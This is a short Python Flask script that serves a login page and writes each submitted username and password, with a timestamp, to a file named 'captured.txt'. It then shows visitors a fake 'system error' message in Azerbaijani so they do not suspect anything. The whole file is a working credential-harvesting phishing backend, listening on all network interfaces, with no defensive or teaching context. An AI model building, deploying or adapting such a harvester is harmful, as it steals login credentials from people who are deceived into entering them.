from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        with open("captured.txt", "a") as file:
            file.write(f"Zaman: {datetime.now()}\nusername: {username}\npassword: {password}\n---\n")

        return "Sistem xətasi baş verdi. Zəhmət olmasa sonra yenidən cəhd edin."

    return render_template("login.html")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
